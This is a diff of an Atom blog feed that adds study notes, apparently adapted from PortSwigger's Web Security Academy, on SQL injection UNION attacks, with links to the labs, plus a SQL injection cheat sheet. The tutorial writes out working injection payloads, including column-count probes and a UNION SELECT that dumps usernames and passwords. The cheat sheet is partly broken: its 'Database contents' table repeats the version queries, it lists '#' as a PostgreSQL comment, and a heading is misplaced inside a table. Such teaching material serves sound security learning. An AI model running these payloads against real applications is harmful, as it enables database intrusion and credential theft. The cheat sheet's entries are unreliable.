@@ -1,9 +1,296 @@
 <?xml version="1.0" encoding="utf-8"?>
-<feed xmlns="http://www.w3.org/2005/Atom"><title>Sphinx - PortSwigger</title><link href="https://sfinx.kozow.com/" rel="alternate"></link><link href="https://sfinx.kozow.com/feeds/portswigger.atom.xml" rel="self"></link><id>https://sfinx.kozow.com/</id><updated>2024-05-19T20:48:00+01:00</updated><entry><title>SQL Injection</title><link href="https://sfinx.kozow.com/article/sql-injection.html" rel="alternate"></link><published>2024-05-19T20:48:00+01:00</published><updated>2024-05-19T20:48:00+01:00</updated><author><name>MedSecure</name></author><id>tag:sfinx.kozow.com,2024-05-19:/article/sql-injection.html</id><summary type="html">&lt;h1&gt;💉SQL Injection&lt;/h1&gt;
-&lt;p&gt;&lt;img alt="Photo" src="https://sfinx.kozow.com/article/SQLI/SQL-Injection.jpg"&gt;&lt;/p&gt;
+<feed xmlns="http://www.w3.org/2005/Atom"><title>Sphinx - PortSwigger</title><link href="https://sfinx.kozow.com/" rel="alternate"></link><link href="https://sfinx.kozow.com/feeds/portswigger.atom.xml" rel="self"></link><id>https://sfinx.kozow.com/</id><updated>2024-05-19T21:05:00+01:00</updated><entry><title>SQL Injection UNION Attacks</title><link href="https://sfinx.kozow.com/article/sqli-union.html" rel="alternate"></link><published>2024-05-19T21:05:00+01:00</published><updated>2024-05-19T21:05:00+01:00</updated><author><name>MedSecure</name></author><id>tag:sfinx.kozow.com,2024-05-19:/article/sqli-union.html</id><summary type="html">&lt;p&gt;&lt;img alt="Photo" src="https://sfinx.kozow.com/article/SQLI_UNION/union_based_sql_injection.png"&gt;&lt;/p&gt;
+&lt;p&gt;When an application is vulnerable to SQL injection and the results of the query are returned within the application's responses, the ==UNION== keyword can be used to retrieve data from other tables within the database. This results in a SQL injection UNION attack.&lt;/p&gt;
+&lt;p&gt;The ==UNION== keyword lets you execute one …&lt;/p&gt;</summary><content type="html">&lt;p&gt;&lt;img alt="Photo" src="https://sfinx.kozow.com/article/SQLI_UNION/union_based_sql_injection.png"&gt;&lt;/p&gt;
+&lt;p&gt;When an application is vulnerable to SQL injection and the results of the query are returned within the application's responses, the ==UNION== keyword can be used to retrieve data from other tables within the database. This results in a SQL injection UNION attack.&lt;/p&gt;
+&lt;p&gt;The ==UNION== keyword lets you execute one or more additional ==SELECT== queries and append the results to the original query. For example:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="k"&gt;SELECT&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;b&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;FROM&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;table1&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;UNION&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;SELECT&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;c&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;d&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;FROM&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;table2&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;This SQL query will return a single result set with two columns, containing values from columns ==a== and ==b== in ==table1== and columns c and d in table2.
+For a ==UNION== query to work, two key requirements must be met:
+* The individual queries must return the same number of columns.
+* The data types in each column must be compatible between the individual queries.&lt;/p&gt;
+&lt;p&gt;⠀To carry out a SQL injection UNION attack, you need to ensure that your attack meets these two requirements. This generally involves figuring out:
+* How many columns are being returned from the original query?
+* Which columns returned from the original query are of a suitable data type to hold the results from the injected query?&lt;/p&gt;
+&lt;h2&gt;Determining the number of columns required in a SQL injection UNION attacks&lt;/h2&gt;
+&lt;p&gt;When performing a SQL injection UNION attack, there are two effective methods to determine how many columns are being returned from the original query.
+The first method involves injecting a series of ==ORDER BY== clauses and incrementing the specified column index until an error occurs. For example, assuming the injection point is a quoted string within the ==WHERE== clause of the original query, you would submit:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="s1"&gt;&amp;#39; ORDER BY 1--&lt;/span&gt;
+&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;ORDER&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;BY&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="c1"&gt;--&lt;/span&gt;
+&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;ORDER&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;BY&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="c1"&gt;--&lt;/span&gt;
+&lt;span class="n"&gt;etc&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;This series of payloads modifies the original query to order the results by different columns in the result set. The column in an ==ORDER BY== clause can be specified by its index, so you don't need to know the names of any columns. When the specified column index exceeds the number of actual columns in the result set, the database returns an error, such as:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;The ORDER BY position number 3 is out of range of the number of items in the select list.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;The application might actually return the database error in its HTTP response, or it might return a generic error, or simply return no results. Provided you can detect some difference in the application's response, you can infer how many columns are being returned from the query.
+The second method involves submitting a series of ==UNION== ==SELECT== payloads specifying a different number of null values:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="s1"&gt;&amp;#39; UNION SELECT NULL--&lt;/span&gt;
+&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;UNION&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;SELECT&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="k"&gt;NULL&lt;/span&gt;&lt;span class="c1"&gt;--&lt;/span&gt;
+&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;UNION&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;SELECT&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="k"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="k"&gt;NULL&lt;/span&gt;&lt;span class="c1"&gt;--&lt;/span&gt;
+&lt;span class="n"&gt;etc&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;If the number of nulls does not match the number of columns, the database returns an error, such as:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Again, the application might actually return this error message, or might just return a generic error or no results. When the number of nulls matches the number of columns, the database returns an additional row in the result set, containing null values in each column. The effect on the resulting HTTP response depends on the application's code. If you are lucky, you will see some additional content within the response, such as an extra row on an HTML table. Otherwise, the null values might trigger a different error, such as a ==NullPointerException==. Worst case, the response might be indistinguishable from that which is caused by an incorrect number of nulls, making this method of determining the column count ineffective.&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;🧪 LAB PRACTITIONER&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;a href="https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns"&gt;SQL injection UNION attack, determining the number of columns returned by the query&lt;/a&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;strong&gt;Note&lt;/strong&gt;
+* The reason for using ==NULL== as the values returned from the injected ==SELECT== query is that the data types in each column must be compatible between the original and the injected queries. Since ==NULL== is convertible to every commonly used data type, using ==NULL== maximizes the chance that the payload will succeed when the column count is correct.
+* On Oracle, every ==SELECT== query must use the ==FROM== keyword and specify a valid table. There is a built-in table on Oracle called ==dual== which can be used for this purpose. So the injected queries on Oracle would need to look like: &lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;UNION&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;SELECT&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;NULL&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;FROM&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;DUAL&lt;/span&gt;&lt;span class="c1"&gt;--&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;blockquote&gt;
+&lt;ul&gt;
+&lt;li&gt;The payloads described use the double-dash comment sequence ==--== to comment out the remainder of the original query following the injection point. On MySQL, the double-dash sequence must be followed by a space. Alternatively, the hash character ==#== can be used to identify a comment.
+  For more details of database-specific syntax, see the [[SQL injection cheat sheet]].&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/blockquote&gt;
+&lt;h2&gt;Finding columns with a useful data type in a SQL injection UNION attack&lt;/h2&gt;
+&lt;p&gt;The reason for performing a SQL injection UNION attack is to be able to retrieve the results from an injected query. Generally, the interesting data that you want to retrieve will be in string form, so you need to find one or more columns in the original query results whose data type is, or is compatible with, string data.
+Having already determined the number of required columns, you can probe each column to test whether it can hold string data by submitting a series of ==UNION SELECT== payloads that place a string value into each column in turn. For example, if the query returns four columns, you would submit:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="s1"&gt;&amp;#39; UNION SELECT &amp;#39;&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;,NULL,NULL,NULL--&lt;/span&gt;
+&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;UNION&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;SELECT&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;a&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="k"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="k"&gt;NULL&lt;/span&gt;&lt;span class="c1"&gt;--&lt;/span&gt;
+&lt;span class="s1"&gt;&amp;#39; UNION SELECT NULL,NULL,&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;,NULL--&lt;/span&gt;
+&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;UNION&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;SELECT&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="k"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="k"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;a&amp;#39;&lt;/span&gt;&lt;span class="c1"&gt;--&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;If the data type of a column is not compatible with string data, the injected query will cause a database error, such as:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;Conversion&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;failed&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;when&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;converting&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;the&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;varchar&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;value&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;a&amp;#39;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;to&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;type&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nb nb-Type"&gt;int&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;If an error does not occur, and the application's response contains some additional content including the injected string value, then the relevant column is suitable for retrieving string data.&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;🧪 LAB PRACTITIONER&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;a href="https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text"&gt;SQL injection UNION attack, finding a column containing text&lt;/a&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h2&gt;Using a SQL injection UNION attack to retrieve interesting data&lt;/h2&gt;
+&lt;p&gt;When you have determined the number of columns returned by the original query and found which columns can hold string data, you are in a position to retrieve interesting data.
+Suppose that:
+* The original query returns two columns, both of which can hold string data.
+* The injection point is a quoted string within the ==WHERE== clause.
+* The database contains a table called ==users== with the columns ==username== and ==password==.&lt;/p&gt;
+&lt;p&gt;⠀In this situation, you can retrieve the contents of the ==users== table by submitting the input:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;UNION&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;SELECT&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;username&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;FROM&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;users&lt;/span&gt;&lt;span class="c1"&gt;--&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Of course, the crucial information needed to perform this attack is that there is a table called ==users== with two columns called ==username== and ==password==. Without this information, you would be left trying to guess the names of tables and columns. In fact, all modern databases provide ways of examining the database structure, to determine what tables and columns it contains.&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;🧪 LAB PRACTITIONER&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;a href="https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables"&gt;SQL injection UNION attack, retrieving data from other tables&lt;/a&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;strong&gt;Read more&lt;/strong&gt;
+* [[Examining the database in SQL injection attacks]]&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h2&gt;Retrieving multiple values within a single column&lt;/h2&gt;
+&lt;p&gt;In the preceding example, suppose instead that the query only returns a single column.
+You can easily retrieve multiple values together within this single column by concatenating the values together, ideally including a suitable separator to let you distinguish the combined values. For example, on Oracle you could submit the input:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="s1"&gt;&amp;#39; UNION SELECT username || &amp;#39;&lt;/span&gt;&lt;span class="o"&gt;~&lt;/span&gt;&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;||&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;FROM&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;users&lt;/span&gt;&lt;span class="c1"&gt;--&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;This uses the double-pipe sequence ==||== which is a string concatenation operator on Oracle. The injected query concatenates together the values of the ==username== and ==password== fields, separated by the ==~== character.
+The results from the query will let you read all of the usernames and passwords, for example:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;...
+administrator~s3cure
+wiener~peter
+carlos~montoya
+...
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Note that different databases use different syntax to perform string concatenation. For more details, see the &lt;a href="https://portswigger.net/web-security/sql-injection/cheat-sheet"&gt;SQL injection cheat sheet&lt;/a&gt;.&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;🧪 LAB PRACTITIONER&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;a href="https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column"&gt;SQL injection UNION attack, retrieving multiple values in a single column&lt;/a&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;</content><category term="PortSwigger"></category></entry><entry><title>SQL Injection Cheat Sheet</title><link href="https://sfinx.kozow.com/article/sqli-cheat-sheet.html" rel="alternate"></link><published>2024-05-19T21:03:00+01:00</published><updated>2024-05-19T21:03:00+01:00</updated><author><name>MedSecure</name></author><id>tag:sfinx.kozow.com,2024-05-19:/article/sqli-cheat-sheet.html</id><summary type="html">&lt;p&gt;&lt;img alt="Photo" src="https://sfinx.kozow.com/article/SQLI_CHEAT_SHEET/black-green-cheat-sheet-stamp-black-green-cheat-sheet-stamp-illustration-graphic-concept-108947651.jpg.webp"&gt;&lt;/p&gt;
+&lt;p&gt;This &lt;strong&gt;SQL injection&lt;/strong&gt; cheat sheet contains examples of useful syntax that you can use to perform a variety of tasks that often arise when performing SQL injection attacks.&lt;/p&gt;
+&lt;h2&gt;String concatenation&lt;/h2&gt;
+&lt;p&gt;You can concatenate together multiple strings to make a single string.&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th style="text-align: center;"&gt;Oracle&lt;/th&gt;
+&lt;th style="text-align: center;"&gt;=='foo'||'bar'==&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td style="text-align: center;"&gt;&lt;strong&gt;Microsoft&lt;/strong&gt;&lt;/td&gt;
+&lt;td style="text-align: center;"&gt;=='foo'+'bar'==&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="text-align: center;"&gt;&lt;strong&gt;PostgreSQL&lt;/strong&gt;&lt;/td&gt;
+&lt;td style="text-align: center;"&gt;=='foo'||'bar' …&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;</summary><content type="html">&lt;p&gt;&lt;img alt="Photo" src="https://sfinx.kozow.com/article/SQLI_CHEAT_SHEET/black-green-cheat-sheet-stamp-black-green-cheat-sheet-stamp-illustration-graphic-concept-108947651.jpg.webp"&gt;&lt;/p&gt;
+&lt;p&gt;This &lt;strong&gt;SQL injection&lt;/strong&gt; cheat sheet contains examples of useful syntax that you can use to perform a variety of tasks that often arise when performing SQL injection attacks.&lt;/p&gt;
+&lt;h2&gt;String concatenation&lt;/h2&gt;
+&lt;p&gt;You can concatenate together multiple strings to make a single string.&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th style="text-align: center;"&gt;Oracle&lt;/th&gt;
+&lt;th style="text-align: center;"&gt;=='foo'||'bar'==&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td style="text-align: center;"&gt;&lt;strong&gt;Microsoft&lt;/strong&gt;&lt;/td&gt;
+&lt;td style="text-align: center;"&gt;=='foo'+'bar'==&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="text-align: center;"&gt;&lt;strong&gt;PostgreSQL&lt;/strong&gt;&lt;/td&gt;
+&lt;td style="text-align: center;"&gt;=='foo'||'bar'==&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="text-align: center;"&gt;&lt;strong&gt;MySQL&lt;/strong&gt;&lt;/td&gt;
+&lt;td style="text-align: center;"&gt;=='foo' 'bar'== [Note the space between the two strings]&lt;br&gt;==CONCAT('foo','bar')==&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="text-align: center;"&gt;## Substring&lt;/td&gt;
+&lt;td style="text-align: center;"&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;You can extract part of a string, from a specified offset with a specified length. Note that the offset index is 1-based. Each of the following expressions will return the string ==ba==.&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th style="text-align: center;"&gt;Oracle&lt;/th&gt;
+&lt;th style="text-align: center;"&gt;==SUBSTR('foobar', 4, 2)==&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td style="text-align: center;"&gt;&lt;strong&gt;Microsoft&lt;/strong&gt;&lt;/td&gt;
+&lt;td style="text-align: center;"&gt;==SUBSTRING('foobar', 4, 2)==&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="text-align: center;"&gt;&lt;strong&gt;PostgreSQL&lt;/strong&gt;&lt;/td&gt;
+&lt;td style="text-align: center;"&gt;==SUBSTRING('foobar', 4, 2)==&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="text-align: center;"&gt;&lt;strong&gt;MySQL&lt;/strong&gt;&lt;/td&gt;
+&lt;td style="text-align: center;"&gt;==SUBSTRING('foobar', 4, 2)==&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h2&gt;Comments&lt;/h2&gt;
+&lt;p&gt;You can use comments to truncate a query and remove the portion of the original query that follows your input.&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th style="text-align: center;"&gt;Oracle&lt;/th&gt;
+&lt;th style="text-align: center;"&gt;==--comment==&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td style="text-align: center;"&gt;&lt;strong&gt;Microsoft&lt;/strong&gt;&lt;/td&gt;
+&lt;td style="text-align: center;"&gt;==/*comment*/==&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="text-align: center;"&gt;&lt;strong&gt;PostgreSQL&lt;/strong&gt;&lt;/td&gt;
+&lt;td style="text-align: center;"&gt;==#comment==&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="text-align: center;"&gt;&lt;strong&gt;MySQL&lt;/strong&gt;&lt;/td&gt;
+&lt;td style="text-align: center;"&gt;==-- comment==  [Note the space after the double dash]&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h2&gt;Database version&lt;/h2&gt;
+&lt;p&gt;You can query the database to determine its type and version. This information is useful when formulating more complicated attacks.&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th style="text-align: center;"&gt;Oracle&lt;/th&gt;
+&lt;th style="text-align: center;"&gt;==SELECT banner FROM v$version==&lt;br&gt;==SELECT version FROM v$instance==&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td style="text-align: center;"&gt;&lt;strong&gt;Microsoft&lt;/strong&gt;&lt;/td&gt;
+&lt;td style="text-align: center;"&gt;==SELECT @@version==&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="text-align: center;"&gt;&lt;strong&gt;PostgreSQL&lt;/strong&gt;&lt;/td&gt;
+&lt;td style="text-align: center;"&gt;==SELECT version()==&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="text-align: center;"&gt;&lt;strong&gt;MySQL&lt;/strong&gt;&lt;/td&gt;
+&lt;td style="text-align: center;"&gt;==SELECT @@version==&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h2&gt;Database contents&lt;/h2&gt;
+&lt;p&gt;You can list the tables that exist in the database, and the columns that those tables contain.&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th style="text-align: center;"&gt;Oracle&lt;/th&gt;
+&lt;th style="text-align: center;"&gt;==SELECT banner FROM v$version==&lt;br&gt;==SELECT version FROM v$instance==&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td style="text-align: center;"&gt;&lt;strong&gt;Microsoft&lt;/strong&gt;&lt;/td&gt;
+&lt;td style="text-align: center;"&gt;==SELECT @@version==&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="text-align: center;"&gt;&lt;strong&gt;PostgreSQL&lt;/strong&gt;&lt;/td&gt;
+&lt;td style="text-align: center;"&gt;==SELECT version()==&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="text-align: center;"&gt;&lt;strong&gt;MySQL&lt;/strong&gt;&lt;/td&gt;
+&lt;td style="text-align: center;"&gt;==SELECT @@version==&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;</content><category term="PortSwigger"></category></entry><entry><title>SQL Injection</title><link href="https://sfinx.kozow.com/article/sql-injection.html" rel="alternate"></link><published>2024-05-19T20:48:00+01:00</published><updated>2024-05-19T20:48:00+01:00</updated><author><name>MedSecure</name></author><id>tag:sfinx.kozow.com,2024-05-19:/article/sql-injection.html</id><summary type="html">&lt;p&gt;&lt;img alt="Photo" src="https://sfinx.kozow.com/article/SQLI/SQL-Injection.jpg"&gt;&lt;/p&gt;
 &lt;p&gt;In this section, we'll explain what SQL injection (SQLi) is, describe some common examples, explain how to find and exploit various kinds of SQL injection vulnerabilities, and summarize how to prevent SQL injection.&lt;/p&gt;
-&lt;p&gt;For a brief resume on all payloads to use for SQL injection testing, try the …&lt;/p&gt;</summary><content type="html">&lt;h1&gt;💉SQL Injection&lt;/h1&gt;
